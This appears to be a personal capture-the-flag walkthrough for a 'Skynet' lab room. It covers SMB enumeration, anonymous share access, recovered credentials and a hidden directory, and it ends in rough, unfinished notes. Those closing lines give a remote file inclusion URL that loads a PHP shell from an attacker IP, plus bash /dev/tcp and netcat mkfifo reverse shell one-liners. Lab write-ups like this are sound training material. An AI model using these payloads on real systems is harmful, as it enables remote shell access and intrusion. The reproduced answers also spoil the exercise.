# Room Skynet 

```
export IP=10.10.162.178
```

## Task 1 

> What is Miles password for his emails?

We could see from our enum4linux scan that there are these shares:

```
[+] Attempting to map shares on 10.10.30.132
//10.10.30.132/print$	Mapping: DENIED, Listing: N/A
//10.10.30.132/anonymous	Mapping: OK, Listing: OK
//10.10.30.132/milesdyson	Mapping: DENIED, Listing: N/A

```

anonumous has read access? 

smb is open so we connect with anonymous:
```
smbclient //$IP/anonymous
```
No pass. To download files use `get FILENAME`. 

From gobuster we could see `http://$IP/squirrelmail/src/login.php` and log1.txt contains possible passwords.

The user is milesdyson and pass and Answer:

```
cyborg007haloterminator
```

> What is the hidden directory?

We have the smb pass for milesdyson in the first mail so we can access that.

```
smbclient -U milesdyson //$IP/milesdyson

```

Get the file in notes. Answer:

```
/45kra24zxs28v3yd
```

> What is the vulnerability called when you can include a remote file for malicious purposes?


```

```

http://10.10.162.178/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.3.181:80/reverse.php

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.9.3.181/1235 0>&1' > /var/www/html/shell

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.181
1234 >/tmp/f" > shell.sh